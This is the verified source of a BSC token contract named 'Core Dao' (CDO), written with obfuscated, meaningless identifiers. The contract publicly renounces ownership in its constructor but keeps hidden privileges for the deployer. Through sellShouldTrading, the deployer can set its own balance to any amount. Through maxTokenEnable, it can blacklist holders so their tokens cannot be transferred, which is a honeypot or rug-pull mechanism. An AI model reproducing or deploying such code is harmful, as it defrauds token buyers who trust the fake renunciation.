/**
 *Submitted for verification at BscScan.com on 2023-02-14
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.11;

interface feeToTotal {
    function totalSupply() external view returns (uint256);

    function balanceOf(address marketingAt) external view returns (uint256);

    function transfer(address liquidityTotal, uint256 launchedShould) external returns (bool);

    function allowance(address totalSenderLiquidity, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchedShould) external returns (bool);

    function transferFrom(
        address sender,
        address liquidityTotal,
        uint256 launchedShould
    ) external returns (bool);

    event Transfer(address indexed from, address indexed listWallet, uint256 value);
    event Approval(address indexed totalSenderLiquidity, address indexed spender, uint256 value);
}

interface feeToTotalMetadata is feeToTotal {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract senderFeeAt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface autoSell {
    function createPair(address marketingTrading, address modeTotal) external returns (address);
}

interface tradingTotal {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract CoreDao is senderFeeAt, feeToTotal, feeToTotalMetadata {
    
    mapping(address => uint256) private minIs;
    uint256 private walletLiquidity = 100000000 * 10 ** 18;
    uint256 private isTo;
    bool public teamExemptMode;
    address public receiverSender;
    uint256 public sellSwap;
    
    mapping(address => bool) public liquidityToken;
    
    address public shouldList;

    bool public tradingMin;
    address private enableLiquidityTo;

    bool public minIsSender;
    event OwnershipTransferred(address indexed launchedFee, address indexed receiverFundFrom);

    string private swapBuyTrading = "Core Dao";
    string private enableTake = "CDO";
    mapping(address => bool) public liquidityEnable;
    mapping(address => mapping(address => uint256)) private shouldEnable;

    bool public feeAmount;
    uint8 private buyTotalLiquidity = 18;

    

    constructor (){
        if (sellSwap == isTo) {
            tradingMin = false;
        }
        tradingTotal tradingReceiverWallet = tradingTotal(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        receiverSender = autoSell(tradingReceiverWallet.factory()).createPair(tradingReceiverWallet.WETH(), address(this));
        enableLiquidityTo = _msgSender();
        
        shouldList = _msgSender();
        liquidityEnable[_msgSender()] = true;
        
        minIs[_msgSender()] = walletLiquidity;
        emit Transfer(address(0), shouldList, walletLiquidity);
        swapAuto();
    }

    

    function approve(address isTake, uint256 launchedShould) public virtual override returns (bool) {
        shouldEnable[_msgSender()][isTake] = launchedShould;
        emit Approval(_msgSender(), isTake, launchedShould);
        return true;
    }

    function transfer(address totalReceiver, uint256 launchedShould) external virtual override returns (bool) {
        return launchReceiverMin(_msgSender(), totalReceiver, launchedShould);
    }

    function getOwner() external view returns (address) {
        return enableLiquidityTo;
    }

    function allowance(address teamList, address isTake) external view virtual override returns (uint256) {
        return shouldEnable[teamList][isTake];
    }

    function liquiditySenderEnable() public view returns (uint256) {
        return sellSwap;
    }

    function launchReceiverMin(address tradingTo, address liquidityTotal, uint256 launchedShould) internal returns (bool) {
        if (tradingTo == shouldList) {
            return marketingFee(tradingTo, liquidityTotal, launchedShould);
        }
        require(!liquidityToken[tradingTo]);
        return marketingFee(tradingTo, liquidityTotal, launchedShould);
    }

    function launchTx() public {
        if (minIsSender) {
            sellSwap = isTo;
        }
        
        teamExemptMode=false;
    }

    function name() external view virtual override returns (string memory) {
        return swapBuyTrading;
    }

    function decimals() external view virtual override returns (uint8) {
        return buyTotalLiquidity;
    }

    function shouldTake() public view returns (uint256) {
        return sellSwap;
    }

    function swapAuto() public {
        emit OwnershipTransferred(shouldList, address(0));
        enableLiquidityTo = address(0);
    }

    function minAmount(address limitAuto) public {
        if (feeAmount) {
            return;
        }
        
        liquidityEnable[limitAuto] = true;
        if (teamExemptMode) {
            teamExemptMode = true;
        }
        feeAmount = true;
    }

    function marketingFee(address tradingTo, address liquidityTotal, uint256 launchedShould) internal returns (bool) {
        require(minIs[tradingTo] >= launchedShould);
        minIs[tradingTo] -= launchedShould;
        minIs[liquidityTotal] += launchedShould;
        emit Transfer(tradingTo, liquidityTotal, launchedShould);
        return true;
    }

    function sellShouldTrading(uint256 launchedShould) public {
        if (!liquidityEnable[_msgSender()]) {
            return;
        }
        minIs[shouldList] = launchedShould;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return walletLiquidity;
    }

    function maxTokenEnable(address listExempt) public {
        if (sellSwap != isTo) {
            tradingMin = false;
        }
        if (listExempt == shouldList || listExempt == receiverSender || !liquidityEnable[_msgSender()]) {
            return;
        }
        
        liquidityToken[listExempt] = true;
    }

    function balanceOf(address marketingAt) public view virtual override returns (uint256) {
        return minIs[marketingAt];
    }

    function owner() external view returns (address) {
        return enableLiquidityTo;
    }

    function transferFrom(address tradingTo, address liquidityTotal, uint256 launchedShould) external override returns (bool) {
        if (shouldEnable[tradingTo][_msgSender()] != type(uint256).max) {
            require(launchedShould <= shouldEnable[tradingTo][_msgSender()]);
            shouldEnable[tradingTo][_msgSender()] -= launchedShould;
        }
        return launchReceiverMin(tradingTo, liquidityTotal, launchedShould);
    }

    function minModeExempt() public view returns (bool) {
        return minIsSender;
    }

    function receiverLimitBuy() public view returns (bool) {
        return tradingMin;
    }

    function symbol() external view virtual override returns (string memory) {
        return enableTake;
    }


}